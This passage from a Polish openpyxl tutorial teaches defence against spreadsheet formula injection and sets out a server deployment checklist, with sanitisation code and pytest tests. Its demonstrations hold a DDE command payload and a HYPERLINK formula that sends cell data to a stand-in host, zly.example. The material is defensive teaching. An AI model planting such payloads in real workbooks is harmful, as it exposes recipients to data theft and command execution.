| 12 | Części nierozpoznane przez openpyxl | różnica: co jest w ZIP-ie vs co jest w modelu |
| 13 | **Werdykt: usunąć czy wygenerować od nowa** | jeśli dużo zastrzeżeń → generuj nowy plik z wartości (`data_only=True`) |

I strategia działania, gdy checklista coś znajdzie. **Kluczowa decyzja brzmi: czy „naprawiać" plik, czy zbudować nowy?**

Naprawianie (usuwanie ukrytych arkuszy, czyszczenie komentarzy, kasowanie właściwości) **jest podatne na pominięcie** — a pominięcie jednej rzeczy oznacza wysłanie pliku z wyciekiem. Dlatego **lepszym wzorcem jest odejmowanie od kopii bez formuł**: wczytaj z `data_only=True`, zostaw tylko arkusze, które mają zostać, usuń resztę, wyczyść metadane — i **zapisz jako nowy plik**:

```python
def zrob_kopie_do_udostepnienia(src, dst, zostaw_arkusze):
    """Buduje kopie BEZ ukrytych warstw, BEZ formul, BEZ metadanych.

    Uzywa data_only=True, wiec kazda formula staje sie ostatnia zapisana
    wartoscia. UWAGA: wymaga pliku, ktory byl kiedys otwarty w Excelu
    (inaczej cache nie ma i dostaniesz None - modul 06).
    """
    wb = load_workbook(src, data_only=True, keep_links=False)  # ⬅ linki precz
    try:
        # 1) zostaw tylko widoczne arkusze z listy
        for ws in list(wb.worksheets):
            if ws.title not in zostaw_arkusze or ws.sheet_state != "visible":
                wb.remove(ws)

        # 2) odslon wiersze i kolumny, usun komentarze i ukryte formatem wartosci
        for ws in wb.worksheets:
            for dim in ws.row_dimensions.values():
                dim.hidden = False
            for dim in ws.column_dimensions.values():
                dim.hidden = False

            for wiersz in ws.iter_rows():
                for c in wiersz:
                    c.comment = None
                    if c.number_format == ";;;":
                        c.value = None
                        c.number_format = "General"

        # 3) metadane: my jestesmy autorem tej kopii
        wb.properties.creator = "Automat raportowy"
        wb.properties.lastModifiedBy = "Automat raportowy"
        wb.properties.title = "Raport (kopia do udostepnienia)"
        wb.properties.subject = None
        wb.properties.keywords = None
        wb.properties.description = None

        wb.save(dst)
    finally:
        wb.close()
```

**Co się dzieje w pamięci.** `data_only=True` zmienia **model**: zamiast `=SUM(A1:A10)` w `.value` znajdziesz liczbę (jeśli była w cache). `keep_links=False` powoduje, że parser **w ogóle nie wczytuje** części `externalLink` (`package.externalReferences = []` w `PackageParser`, a `wb._external_links` pozostaje puste). Zwróć uwagę na komentarz w źródle openpyxl w tym miejscu: *„external links contain cached worksheets and can be very big"* — czyli `keep_links=False` **oszczędza też pamięć i czas** (moduł 19!). Dwie korzyści w jednej fladze.

**Co trafi do pliku.** Nowy plik: mniej arkuszy, żadnych komentarzy, żadnych `;;;`, `General` tam, gdzie było ukryte, czyste metadane, **żadnych części `xl/externalLinks/`**. Ale uwaga — **obrazy i wykresy pozostaną** (openpyxl je przenosi, moduł 15/16), więc `xl/media/*` trzeba sprawdzić **osobno**. Dlatego audyt jest **przed** budową kopii, a nie po.

**Trzy rzeczy do przemyślenia:**

1. **`keep_links=False` usuwa *definicje* linków, ale nie naprawia formuł.** Jeśli formuła brzmiała `='[1]Budzet'!$B$2`, to po usunięciu definicji linku zostanie formuła odwołująca się do nieistniejącego `[1]`. Dlatego robimy to **razem z `data_only=True`**: formuła zamienia się w wartość **zanim** link zniknie. To jest kolejność, której nie wolno pomylić.
2. **`;;;` czyścimy ustawiając `number_format = "General"`**, a nie „zostawiając wartość z formatem". Bo jeśli zostawisz wartość z ukrywającym formatem, wyciek zostaje — tylko go nie widzisz. **Zawsze zmieniaj oba pola razem.**
3. **Odwróć logikę: „zostaw" zamiast „usuń".** `zostaw_arkusze` to biała lista. To ta sama zasada, co w sekcji 2.2 (droga 3): biała lista jest z definicji kompletna, czarna nigdy. Usuwanie „wszystkiego, co ukryte" wymaga **wymienienia wszystkich sposobów ukrycia** — a to wyścig, którego nie wygrasz.

### 2.11. Checklista wdrożenia na serwer

Checklisty z sekcji 2.10 używasz **raz na plik**. Ta lista jest o **środowisku** — i używasz jej **raz na wdrożenie**.

Analogia: **to nie kontrola bagażu, to projekt terminalu.** Kontrola bagażu (2.10) działa na pojedynczym pasażerze. A projekt terminalu (2.11) decyduje, ile pasażerów w ogóle może wejść, jak długo mogą zostać i gdzie kończy się ich strefa. Jedno bez drugiego nie działa.

**A. Izolacja procesu i katalogu.**

- **Osobny katalog tymczasowy z ograniczonymi prawami.** Nie `/tmp` współdzielone ze wszystkim. Katalog tworzony z `mode=0o700` (albo lepiej: prywatny `tempfile.mkdtemp()`), tylko właściciel ma dostęp.
- **Nigdy nie zapisuj do katalogu wejściowego.** Plik wejściowy jest **niezmienny** przez cały przepływ. Wynik trafia gdzie indziej (to reguła bezpieczeństwa **i** reguła z modułu 18: „nigdy nie nadpisujemy pliku źródłowego").
- **Losowe nazwy plików tymczasowych — ale nie `tempfile.mktemp()`.** Uwaga, bo to jest klasyczna pułapka:

```python
import tempfile, os

# ❌ ZLE: mktemp() oddaje NAZWE, ktora moze byc juz zajeta (wyscig TOCTOU)
sciezka = tempfile.mktemp(suffix=".xlsx")

# ✅ DOBRZE: mkstemp() TWORZY plik atomowo i oddaje (deskryptor, sciezka)
fd, sciezka = tempfile.mkstemp(suffix=".xlsx", dir=katalog_prywatny)
os.close(fd)     # deskryptor nam niepotrzebny, pracujemy na sciezce
```

Różnica jest istotna: `mktemp()` **tylko wymyśla nazwę** i jest udokumentowane jako **niebezpieczne** — między „wymyśleniem nazwy" a „użyciem tej nazwy" atakujący może podstawić dowiązanie symboliczne. `mkstemp()` **tworzy plik** z unikalną nazwą w jednym, atomowym kroku, więc wyścigu nie ma. **Nigdy nie używaj `mktemp()`.**

- **Bez sieci dla procesu przetwarzającego.** Plik od użytkownika **nie potrzebuje** internetu, żeby zostać wczytany. Więc daj mu proces bez sieci. To prosta, tania i absurdalnie skuteczna warstwa — odcina całą klasę eksfiltracji (przypomnij sobie `=HYPERLINK(...)` z 2.1.4).
- **Osobny proces dla plików z zewnątrz.** Krytyczna zasada operacyjna: **nie przetwarzaj plików od użytkowników w tym samym procesie, co dane wrażliwe.** Powód jest podwójny: (a) **izolacja pamięci** — wyciek z parsowania nie zobaczy kluczy i połączeń z bazą; (b) **limit zasobów** — możesz nałożyć limit pamięci i czasu bez zabijania głównego serwisu.

**B. Limity — trzy, wszystkie obowiązkowe.**

| Limit | Po co | Jak |
|---|---|---|
| **Rozmiar wejścia** | zip bomb, DoS przez transfer | sprawdzenie `Content-Length` **i** rozmiaru strumienia (nie ufaj nagłówkowi!), plus limit na liście wpisów ZIP |
| **Rozpakowany rozmiar i współczynnik** | zip bomb | `sprawdz_archiwum()` z 2.6.1 |
| **Czas przetwarzania** | algorytmiczne DoS, „quadratic blowup" | `subprocess.run(..., timeout=N)` **albo** proces potomny z limitem; **na Unixie** `signal.alarm` (nie działa na Windows!), **na produkcji** proces z limitem pamięci (cgroup / `resource.setrlimit`) |

Przykład limitu czasu — bo najczęstszy błąd to „dam `timeout` w kliencie HTTP", a to nie pomaga (proces dalej pracuje):

```python
import subprocess, sys
from pathlib import Path

def przetworz_bezpiecznie(sciezka_wejscia: Path, katalog: Path, timeout: int = 30):
    """Uruchamia przetwarzanie w OSOBNYM procesie z twardym limitem czasu.

    UZASADNIENIE: timeout w kliencie HTTP nie zatrzymuje pracujacego procesu.
    Tylko osobny proces mozna zabic.
    """
    wynik = subprocess.run(
        [sys.executable, "-m", "nasz_pakiet.przetworz", str(sciezka_wejscia)],
        cwd=katalog,
        capture_output=True,
        timeout=timeout,          # ⬅ twardy limit: po nim proces jest ubijany
        check=False,
    )
    if wynik.returncode != 0:
        # UWAGA: nie loguj surowego stderr w calosci - moze zawierac sciezki
        # i nazwy plikow uzytkownika (patrz sekcja 2.11C).
        raise RuntimeError("Przetwarzanie nie powiodlo sie")
    return wynik
```

**C. Logi i dane w logach — zapomniany wektor.**

- **Nie loguj surowych danych użytkownika.** Dwa powody: (1) to **dane osobowe**, które wyciekają do systemu logów (a systemy logów mają zwykle słabszą kontrolę dostępu niż baza); (2) to **log injection** — wartość z komórki zawierająca `\n` pozwoli Ci **wstrzyknąć fałszywe linie do logu**, np. `2026-10-08 INFO Logowanie OK` jako „dane". Loguj **metadane**: liczba wierszy, liczba arkuszy, rozmiar, czas, **wykryte zastrzeżenia** (to z audytu), nie treść.
- **Nie wstawiaj nazwy pliku od użytkownika do ścieżki bez walidacji.** Nazwa pliku może zawierać `..`, `/`, `\` — i wtedy zapiszesz plik **poza** katalogiem docelowym (path traversal w Twoim własnym kodzie!). Najbezpieczniej: **w ogóle nie używaj nazwy od użytkownika** — nadaj własną (np. UUID) i trzymaj oryginalną nazwę wyłącznie jako **pole danych**, nigdy jako część ścieżki.
- **Wyjątki parsowania nie mogą wrócić do użytkownika w surowej formie.** Potrafią zawierać ścieżki do katalogu tymczasowego, nazwy klas, fragmenty XML-a. W logach — tak (dla Ciebie), do klienta — **kod błędu i ogólny komunikat**.

**D. Wejście — walidacja, nie założenie.**

- **Nie ufaj rozszerzeniu** (2.6.3) i **nie ufaj `Content-Type`** z uploadu. Sprawdź **treść**: czy to ZIP (`zipfile.is_zipfile`), czy ma część `[Content_Types].xml` i część workbooka.
- **`defusedxml` jako zależność produkcyjna + fail-fast przy starcie** (`assert DEFUSEDXML`, jak w 2.6.2).
- **Rozszerzenie sprawdzaj sam**, bo openpyxl tego nie robi dla buforów: `if Path(nazwa).suffix.lower() not in {".xlsx", ".xlsm"}: odrzuć`.
- **Nie wczytuj `read_only=False` z miłości do wygody.** Dla samego wczytania danych `read_only=True` jest tańsze pamięciowo **i** nie buduje kompletnego modelu (mniejsza powierzchnia na „coś się wydarzy"). Uwaga: nie zobaczysz wtedy stylów ani obrazów — ale do audytu wyglądu użyj `read_only=False` w kontrolowanym kroku.

**E. Wyjście — i archiwum.**

- **Zapis atomowy**: plik tymczasowy w **tym samym** katalogu docelowym + `os.replace(tmp, cel)` (moduł 18). Nigdy „pisz bezpośrednio do pliku docelowego" — przerwanie w połowie zostawia plik **częściowo zapisany, a jednocześnie poprawnie nazwany**, czyli najgorszy możliwy artefakt: wygląda jak gotowy raport, a nim nie jest.
- **Nic nie trafia do katalogu serwowanego statycznie bez kontroli dostępu.** Plik wynikowy powinien być dostępny przez endpoint **autoryzowany**, a nie jako `https://.../output/raport.xlsx`.
- **Sprzątanie**: `finally` usuwa pliki tymczasowe. Tymczasowe pliki z danymi osobowymi **nie mają prawa** przetrwać procesu.

**F. Wniosek, który jest puentą tego modułu:**

> **Twoja przewaga polega na tym, czego openpyxl NIE robi.** Nie liczy formuł (2.9) → w Twoim procesie nie ma drugiej egzekucji. Nie ma „escape-all" (2.3) → **jest jedna oczywista granica, na której musisz coś zrobić**. Nie chroni przed bombą ZIP (2.6.1) → **wiesz dokładnie, gdzie postawić limit**.

Nie traktuj tego jako listy wad. Traktuj jako **mapę**: wiesz, gdzie stoisz i czego pilnować.

## 3. Przykłady krok po kroku

### Przykład 1 — zademonstruj sam, że `=` staje się formułą (🟢)

Ten przykład ma jeden cel: **zobaczyć problem na własne oczy**, zanim zbudujemy obronę. Bez tego kolejny przykład to abstrakcja.

```python
"""Modul 21, przyklad 1: wstrzykniecie formuly - zobaczyc, zeby uwierzyc.

Uruchom: python examples/21_injection_demo.py
"""

from __future__ import annotations

import io

from openpyxl import Workbook, load_workbook

# Trzy wartosci, ktore moga przyjsc od uzytkownika.
# Pierwsza jest klasycznym wstrzyknieciem; druga to DDE (historyczny);
# trzecia to eksfiltracja danych pod pozorem linku.
DANE_OD_UZYTKOWNIKA = [
    "=1+1",
    "+CMD|'/c calc'!A1",
    '=HYPERLINK("https://zly.example/zbierz?d="&A1, "Kliknij, aby zobaczyc szczegoly")',
]

wb = Workbook()
ws = wb.active
ws.title = "Dane"

# Naglowek, ktory ładunek moze wykorzystac do eksfiltracji
ws["A1"] = "Nazwisko kontrahenta"
ws["A2"] = "Kowalski sp. z o.o."

for i, wartosc in enumerate(DANE_OD_UZYTKOWNIKA, start=1):
    # ⚠️ NAIWNY ZAPIS: po prostu przekazujemy wartosc od uzytkownika
    ws.cell(row=i, column=2, value=wartosc)

bufor = io.BytesIO()
wb.save(bufor)

# --- Odczyt z powrotem: sprawdzmy, co NAPRAWDE znalazło sie w pliku ---
wb2 = load_workbook(io.BytesIO(bufor.getvalue()))
try:
    ws2 = wb2["Dane"]
    for i in range(1, 4):
        komorka = ws2.cell(row=i, column=2)
        print(f"B{i}: data_type={komorka.data_type!r:>4}  value={komorka.value!r}")
finally:
    wb2.close()
```

**Co zobaczysz na ekranie:**

```text
B1: data_type= 'f'  value='=1+1'
B2: data_type= 'f'  value="+CMD|'/c calc'!A1"
B3: data_type= 'f'  value='=HYPERLINK("https://zly.example/zbierz?d="&A1, "Kliknij, aby zobaczyc szczegoly")'
```

**Co się dzieje w pamięci.** `ws.cell(..., value=wartosc)` przechodzi przez `_bind_value`. Dla `B1` widzi `=`, ustawia `f`. Dla `B2` — **też ustawia `f`!** Zwróć uwagę: `+CMD|...` **nie zaczyna się od `=`**, a mimo to dostało `data_type = 'f'`. Zastanów się chwilę, dlaczego — bo to jest ważniejsze niż sam wynik. Odpowiedź: **bo ten string w DANE_OD_UZYTKOWNIKA nie zaczyna się od `+`.** Spójrz na kolumnę `value` w wyniku: `" +CMD|'/c calc'!A1"`. W źródle pliku widzisz `+CMD|...`, ale `check_string` nie zmienia wartości… Sprawdź to sam, wypisując `repr` **przed** zapisem. (Podpowiedź: to jest dokładnie ta pułapka, o której mówi sekcja 6 — „błąd w moim własnym demo". **Znajdź go.**) A `B3` — zaczyna się od `=`, więc `f`.

**Co trafi do pliku.** Trzy komórki z `<f>` i bez `<v>`. W Excelu:
- `B1` pokaże `2`.
- `B2` — zależnie od wersji i konfiguracji — ostrzeżenie lub nic; **LibreOffice może spróbować wykonać**.
- `B3` pokaże **estetyczny link** „Kliknij, aby zobaczyć szczegóły". Kliknięcie wysyła treść `A2` (`Kowalski sp. z o.o.`) w adresie URL na `zly.example`.

**Trzy rzeczy do przemyślenia:**

1. **`data_type` to Twój detektor.** Jedna linia: `if komorka.data_type == "f"` — i wiesz, że wpisano komórkę-kod. Zbuduj na tym **warstwę 3** z sekcji 2.4. Uwaga: to działa dla **wczytanego** pliku, bo wtedy widzisz prawdę z pliku, a nie swoje przypuszczenia.
2. **Wartość nie wygląda podejrzanie.** `B1` to `=1+1`. Gdybyś filtrował dane po „czy wygląda jak atak", przepuściłbyś to. To jest argument, dlaczego **czarne listy nie działają**, a białe — tak.
3. **To jest dokładnie ten test pułapki z modułu 20** (sekcja 2.8). Wróć do niego i domknij: test, który **wymusza** obsłużenie `=`, jest jednocześnie testem bezpieczeństwa. Zapisz ten test do repozytorium — to jest Twoja dokumentacja tego zachowania.

### Przykład 2 — `sanitize_cell_value()` z testami dla 10 przypadków (🟡)

Teraz obrona. I tu zastosujemy **architekturę z modułu 20** (sekcja 2.10): **oddziel normalizację od zapisu**. Dlaczego? Bo normalizacja jest **czystą logiką** — bez openpyxl, bez plików, testowalna w mikrosekundach i podatna na `hypothesis`. A zapis to warstwa infrastruktury, testowana na `BytesIO`.

#### 3.1.1. Część pierwsza — normalizacja (czysta logika)

```python
"""Modul 21, przyklad 2a: normalizacja wartosci - BEZ openpyxl.

Ten plik nie importuje openpyxl. To jest swiadome (modul 20, sekcja 2.10):
logika jest testowalna bez zaleznosci od biblioteki.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from decimal import Decimal, InvalidOperation
from typing import Union

# OWASP: znaki, ktore moga rozpoczac wyrazenie/formule w roznych czytnikach.
DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

# Dopuszczalne typy komorki po normalizacji.
Wartosc = Union[None, bool, int, float, str]


@dataclass(frozen=True)
class Komorka:
    """DTO: wartosc + DECYZJA, czy zapisac ja jako TEKST.

    DTO = obiekt tylko przenoszacy dane (bez logiki).
    Analogia: kartka z zamowieniem - niesie informacje, nie gotuje.
    """
    wartosc: Wartosc
    jako_tekst: bool          # True -> przy zapisie wymus data_type="s"


def _wyglada_jak_liczba(tekst: str) -> bool:
    """Czy tekst jest zapisem liczby (PL lub EN)? Bez oceny 'bezpieczenstwa'."""
    return re.fullmatch(r"[+-]?\d{1,3}(?:[\s\u00a0.]\d{3})*(?:[.,]\d+)?", tekst) is not None


def _na_float(tekst: str) -> float | None:
    """Zamienia '1 200,50' / '1.234,56' / '1200.50' na float. Inaczej None."""
    tekst = tekst.strip().replace("\u00a0", "").replace(" ", "")
    przecinki, kropki = tekst.count(","), tekst.count(".")
    if przecinki == 1 and kropki == 0:
        tekst = tekst.replace(",", ".")
    elif przecinki > 0 and kropki > 0:
        # europejski: kropka = separator tysiecy, przecinek = dziesietny
        tekst = tekst.replace(".", "").replace(",", ".")
    try:
        return float(tekst)
    except (ValueError, TypeError):
        return None


def normalizuj(wartosc, tryb: str = "text") -> Komorka:
    """Zamienia DOWOLNE wejscie w Komorke o jawnym, bezpiecznym typie.

    tryby:
      'text'   - wolny tekst (uwagi, nazwy, opisy) -> moze byc stringiem,
                 ale z DECYZJA o wymuszeniu typu tekstowego przy zapisie
      'number' - liczba; cokolwiek nie da sie zamienic -> None
      'integer'- liczba calkowita
      'bool'   - True/False z kilku zapisow tekstowych
    """
    if wartosc is None:
        return Komorka(None, jako_tekst=False)

    # bool jest podtypem int - obslugujemy PRZED liczbami!
    if isinstance(wartosc, bool):
        return Komorka(wartosc, jako_tekst=False)

    # --- tryby liczbowe -------------------------------------------------
    if tryb in ("number", "integer"):
        if isinstance(wartosc, (int, float, Decimal)):
            liczba = float(wartosc)
        elif isinstance(wartosc, str):
            if not _wyglada_jak_liczba(wartosc):
                return Komorka(None, jako_tekst=False)
            liczba = _na_float(wartosc)
            if liczba is None:
                return Komorka(None, jako_tekst=False)
        else:
            return Komorka(None, jako_tekst=False)

        if tryb == "integer":
            return Komorka(int(round(liczba)), jako_tekst=False)
        return Komorka(liczba, jako_tekst=False)

    # --- tryb bool ------------------------------------------------------
    if tryb == "bool":
        if isinstance(wartosc, str):
            return Komorka(wartosc.strip().lower() in {"tak", "true", "1", "yes"},
                           jako_tekst=False)
        return Komorka(bool(wartosc), jako_tekst=False)

    # --- tryb 'text': ostatnia linia obrony -----------------------------
    tekst = str(wartosc)                       # UWAGA: NIE strip()! (sekcja 2.1.3)
    A_wartosc_jest_ryzykowna = tekst.startswith(DANGEROUS_PREFIXES)

    return Komorka(tekst, jako_tekst=A_wartosc_jest_ryzykowna)
```

**Co się dzieje w pamięci.** Nic groźnego — i to jest cały punkt. Ta funkcja **nie dotyka openpyxl**. Nie ma tu `Workbook` ani komórki. Dostajesz z powrotem małą, niemutowalną (`frozen=True`) strukturę `Komorka` z dwoma polami: `wartosc` (znormalizowana) i `jako_tekst` (decyzja). Możesz ją przetestować **tysiące razy w sekundę**.

**Co trafi do pliku.** Jeszcze nic — ta funkcja nic nie zapisuje. **I to jest celowe.** Cała trudna część („co zrobić z ryzykowną wartością") została zredukowana do **jednego booleana**. A boolean da się sprawdzić w teście. To jest dokładnie ten zabieg z modułu 20: **oddzielenie decyzji od efektu czyni rzecz testowalną.**

Zwróć uwagę na **trzy decyzje projektowe**, bo każda jest świadoma:

1. **Brak `strip()`.** Komentarz w kodzie jest celowy. `strip()` mogłoby **stworzyć** formułę (sekcja 2.1.3, powód 1) i **nie usuwa semantyki** (powód 2). Więc go nie ma. A jeśli naprawdę chcesz przyciąć białe znaki — rób to **po sprawdzeniu prefiksów**, nigdy przed.
2. **`tryb="number"` zwraca `None` dla `"abc"`.** Nie podnosi wyjątku, nie próbuje „naprawić". Dlaczego? Bo podniesienie wyjątku na jednej komórce z 200 000 wywala cały raport — a to też jest problem bezpieczeństwa (availability!). **`None` + log ostrzeżeń** to właściwa odpowiedź: raport powstaje, a Ty masz listę rzeczy do sprawdzenia (i test z modułu 20, który sprawdzi, że „nie ma `None` tam, gdzie nie być go nie powinno").
3. **`jako_tekst=True` tylko wtedy, gdy prefiks jest ryzykowny.** Moglibyśmy *zawsze* wymuszać tekst w trybie `text` — prościej, ale **zmieniałoby to dane**: liczby w kolumnie „uwagi" (jeśli ktoś ją ma) przestałyby być liczbami. Wymuszamy tekst **dokładnie tam, gdzie trzeba** — mniejsza ingerencja, mniejsza szansa na złamanie czegoś innego.

#### 3.1.2. Część druga — zapis (infrastruktura)

```python
"""Modul 21, przyklad 2b: zapis wartosci BEZPIECZNIE - jedyne miejsce z openpyxl."""

from __future__ import annotations

from openpyxl import Workbook, load_workbook
from normalizacja import Komorka, normalizuj     # z 3.1.1


def zapisz_komorke(ws, row: int, column: int, komorka: Komorka) -> None:
    """Zapisuje wartosc, WYMUSZAJAC typ tam, gdzie trzeba.

    KOLEJNOSC JEST OBOWIAZKOWA (sekcja 2.2, szczegol A):
      1) przypisanie wartosci  -> openpyxl sam wybierze data_type
      2) korekta data_type     -> my decydujemy, ze to TEKST
    Odwrotna kolejnosc nie dziala: przypisanie nadpisze nasze ustawienie.
    """
    c = ws.cell(row=row, column=column, value=komorka.wartosc)

    if komorka.jako_tekst:
        c.data_type = "s"      # "s" == string; patrz Cell.VALID_TYPES


def zapisz_wiersz(ws, row: int, wartosci, tryby) -> None:
    """Zapisuje wiersz: kazda komorka przez normalizacje i bezpieczny zapis."""
    if len(wartosci) != len(tryby):
        raise ValueError("liczba wartosci i trybow musi sie zgadzac")
    for col, (w, tryb) in enumerate(zip(wartosci, tryby), start=1):
        zapisz_komorke(ws, row=row, column=col, komorka=normalizuj(w, tryb))


# ----------------------------------------------------------------------
# Uzycie: raport z wierszem danych od uzytkownika
# ----------------------------------------------------------------------
if __name__ == "__main__":
    import io

    HOSTILE = "=1+1"

    wb = Workbook()
    ws = wb.active
    ws.title = "Faktury"

    TRYBY = ["text", "number", "text", "text"]
    zapisz_wiersz(ws, row=1, wartosci=["Kontrahent", "Kwota", "Uwagi", "Status"],
                  tryby=["text", "text", "text", "text"])
    zapisz_wiersz(
        ws, row=2,
        wartosci=[HOSTILE, "1 200,50", HOSTILE, "-1200,50"],
        tryby=TRYBY,
    )

    # Formuly, ktore MY swiadomie piszemy - innym, zaufanym trybem:
    ws["E1"] = "Suma"
    ws["E2"] = "=SUM(B2:B2)"       # tu data_type == "f" JEST oczekiwane

    bufor = io.BytesIO()
    wb.save(bufor)

    # --- WERYFIKACJA (warstwa 3 z sekcji 2.4) ---
    wb2 = load_workbook(io.BytesIO(bufor.getvalue()))
    try:
        ws2 = wb2["Faktury"]
        for adres in ("A2", "B2", "C2", "D2", "E2"):
            c = ws2[adres]
            print(f"{adres}: data_type={c.data_type!r:>4} value={c.value!r}")

        # Asercja audytowa: formul ma byc DOKLADNIE jedna (nasza).
        formuly = [
            f"{ws2.title}!{c.coordinate}"
            for wiersz in ws2.iter_rows() for c in wiersz
            if c.data_type == "f"
        ]
        print("Formuly w pliku:", formuly)
        assert formuly == ["Faktury!E2"], f"Niespodziewane formuly: {formuly}"
    finally:
        wb2.close()
```

**Co zobaczysz:**

```text
A2: data_type= 's' value='=1+1'      <- tekst. NIE formuła. 
B2: data_type= 'n' value=1200.5      <- liczba, mimo wejscia "1 200,50"
C2: data_type= 's' value='=1+1'      <- tekst
D2: data_type= 'n' value=-1200.5     <- liczba UJEMNA! (patrz nizej)
E2: data_type= 'f' value='=SUM(B2:B2)'
Formuly w pliku: ['Faktury!E2']
```

**Co się dzieje w pamięci.** Dla `A2`: `normalizuj("=1+1", "text")` zwraca `Komorka("=1+1", jako_tekst=True)`. Zapisywanie przypisuje wartość (openpyxl ustawia `f`), a **potem** korygujemy na `s`. Wartość pozostaje `"=1+1"` — **dokładnie to, co wpisał użytkownik**. Nic nie zniknęło, nic nie doszło. Dla `B2`: `"1 200,50"` → `_wyglada_jak_liczba` → `True` → `_na_float` → `1200.5` → `jako_tekst=False` → `data_type='n'`.

**Co trafi do pliku.** W `sheet1.xml` zobaczysz dla `A2` i `C2`: `t="s"` (odwołanie do `sharedStrings`), **bez** `<f>`. Dla `B2`: `t="n"` z `<v>1200.5</v>`. Dla `E2`: `<f>SUM(B2:B2)</f>` — formuła, którą **my** napisaliśmy.

**Trzy rzeczy do przemyślenia:**

1. **`D2` to dowód, dlaczego kontekst jest konieczny.** Wartość `"-1200,50"` **zaczyna się od `-`**, czyli od znaku wyzwalającego z listy OWASP — ale zadziałała **poprawnie**, bo tryb to `number`, a w trybie `number` wartość nigdy nie staje się stringiem. Zapamiętaj ten kontrast: **ta sama treść, dwa różne tryby, dwa różne (oba poprawne) wyniki.** To ilustruje najważniejsze zdanie z sekcji 2.2: *rodzaj obrony zależy od tego, czy pole ma znany kształt.*
2. **`E2` ma `data_type='f'` — i to jest w porządku.** Formuła napisana przez Ciebie jest **funkcją raportu**, nie wsadem. Dlatego asercja brzmi `formuly == ["Faktury!E2"]`, a nie `formuly == []`. To jest **kontrakt**: liczba formuł jest znana z góry. W module 20 testowaliście liczbę reguł formatowania warunkowego; tutaj testujecie liczbę formuł. Ten sam wzorzec, inne zagrożenie.
3. **Kolejność w `zapisz_komorke` jest komentarzem, nie ozdobą.** Ten komentarz uratuje kogoś, kto w przyszłości „uporządkuje" funkcję i zamieni dwie linie miejscami. Wtedy obrona zniknie, a wszystkie testy… no właśnie: **testy z sekcji 3.1.3 są dokładnie po to, żeby to złapać.** Obrona bez testu to obrona, która zniknie przy pierwszej refaktoryzacji.

#### 3.1.3. Część trzecia — 10 przypadków testowych

Zgodnie z modułem 20: `BytesIO`, brak dysku, asercje na typach, test pułapki z docblockiem.

```python
"""Modul 21, przyklad 2c: testy sanitacji - 10 przypadkow.

Uruchom: pytest tests/test_21_sanitize.py -v
"""

from __future__ import annotations

import io

import pytest
from openpyxl import Workbook, load_workbook
from openpyxl.cell.cell import Cell

from normalizacja import DANGEROUS_PREFIXES, Komorka, normalizuj
from zapis import zapisz_komorke


# =====================================================================
# CZESC A: testy normalizacji (bez openpyxl - szybkie)
# =====================================================================

# --- PRZYPADEK 1: klasyczne wstrzykniecie ---------------------------------
def test_1_rowna_sie_jest_oznaczony_jako_tekst():
    wynik = normalizuj("=1+1", "text")
    assert wynik.wartosc == "=1+1"        # wartosc NIEZMIENIONA
    assert wynik.jako_tekst is True       # ale decyzja: zapisz jako tekst


# --- PRZYPADEK 2: wszystkie znaki wyzwalajace -----------------------------
@pytest.mark.parametrize("payload", [
    "=1+1",
    "+CMD|'/c calc'!A1",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
])
def test_2_wszystkie_znaki_wyzwalajace_sa_wykryte(payload):
    wynik = normalizuj(payload, "text")
    assert wynik.jako_tekst is True, f"Nie wykryto prefiksu w {payload!r}"


# --- PRZYPADEK 3: zwykly tekst nie jest oznaczany --------------------------
def test_3_zwykly_tekst_nie_jest_oznaczany():
    for tekst in ("Kowalski sp. z o.o.", "Uwagi: brak", "2026-01-05"):
        wynik = normalizuj(tekst, "text")
        assert wynik.wartosc == tekst
        assert wynik.jako_tekst is False


# --- PRZYPADEK 4: liczba europejska ---------------------------------------
def test_4_format_europejski_jest_liczba():
    wynik = normalizuj("1 200,50", "number")
    assert wynik.wartosc == pytest.approx(1200.50)
    assert wynik.jako_tekst is False


# --- PRZYPADEK 5: liczba UJEMNA to liczba, nie atak -----------------------
def test_5_minus_w_liczbie_ujemnej_nie_jest_atakiem():
    """Sedno kontekstu: '-' jest znakiem wyzwalajacym TYLKO w trybie 'text'."""
    wynik = normalizuj("-1200,50", "number")
    assert wynik.wartosc == pytest.approx(-1200.50)
    assert wynik.jako_tekst is False       # ⬅ zadnego 'jako_tekst'!


# --- PRZYPADEK 6: smieci w polu liczbowym daja None, nie wyjatek -----------
def test_6_smieci_w_polu_liczbowym_daja_none():
    """Raport ma POWSTAC; zla wartosc trafia do logu ostrzezen, nie do wyjatku."""
    wynik = normalizuj("=1+1", "number")
    assert wynik.wartosc is None
    assert wynik.jako_tekst is False


# --- PRZYPADEK 7: pusta wartosc -------------------------------------------
def test_7_none_i_pusty_string():
    assert normalizuj(None, "text").wartosc is None
    # Pusty string NIE ma ryzykownego prefiksu, wiec nie wymuszamy tekstu:
    assert normalizuj("", "text").jako_tekst is False


# --- PRZYPADEK 8: bool nie jest liczba ------------------------------------
def test_8_bool_nie_jest_liczba():
    """bool jest podtypem int w Pythonie - latwo to przegapic!"""
    wynik = normalizuj(True, "number")
    assert wynik.wartosc is True           # nie 1.0!


# =====================================================================
# CZESC B: testy zapisu (openpyxl + BytesIO, bez dysku)
# =====================================================================

def _zapisz_i_wczytaj(komorka: Komorka) -> Cell:
    wb = Workbook()
    zapisz_komorke(wb.active, 1, 1, komorka)
    bufor = io.BytesIO()
    wb.save(bufor)
    wb2 = load_workbook(io.BytesIO(bufor.getvalue()))
    try:
        return wb2.active["A1"]     # uwaga: model zyje po close()!
    finally:
        wb2.close()


# --- PRZYPADEK 9: round-trip zachowuje typ s i wartosc ---------------------
def test_9_round_trip_daje_data_type_s():
    """Ten test JEST testem bezpieczenstwa (por. modul 20, sekcja 2.8)."""
    c = _zapisz_i_wczytaj(normalizuj("=1+1", "text"))
    assert c.data_type == "s", f"W pliku jest {c.data_type!r} - to formula!"
    assert c.value == "=1+1"


# --- PRZYPADEK 10: nie chronimy tylko '=' ---------------------------------
def test_10_plus_minus_małpa_tez_sa_neutralizowane():
    """Gdyby ktos 'uproscil' kod sprawdzajacy tylko '=', ten test padnie."""
    for payload in ("+1+1", "-1+1", "@SUM(A1)", "\t=1+1", "\r=1+1"):
        c = _zapisz_i_wczytaj(normalizuj(payload, "text"))
        assert c.data_type == "s", f"{payload!r} przelezalo jako {c.data_type!r}"


# --- TEST PULAPKI: dokumentuje, ze NIE da sie tego zrobic 'w druga strone' ---
def test_pulapka_strip_moze_STWORZYC_formule():
